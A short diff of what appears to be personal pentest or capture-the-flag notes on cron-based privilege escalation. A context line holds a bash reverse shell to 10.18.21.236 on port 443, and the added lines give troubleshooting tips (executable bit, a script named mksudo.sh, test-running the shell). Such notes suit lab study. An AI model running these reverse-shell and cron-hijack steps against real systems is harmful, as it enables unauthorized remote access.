@@ -5,8 +5,15 @@
 bash -i >& /dev/tcp/10.18.21.236/443 0>&1
 ```
 
-Don't forget to make sure your script file is executable `chmod +x [script]`
-cron won't run without both #! and +x
+<font color="red">Don't forget to make sure your script file is executable `chmod +x [script]`
+cron won't run without both #! and +x</font>
+Also testrun shell as current user before waiting for scheduled job to run
+
+---
+
+If you get the error:
+`mksudo.sh: 8: mksudo.sh: Syntax error: Bad fd number`
+you're running with sh, not bash
 
 ---
 
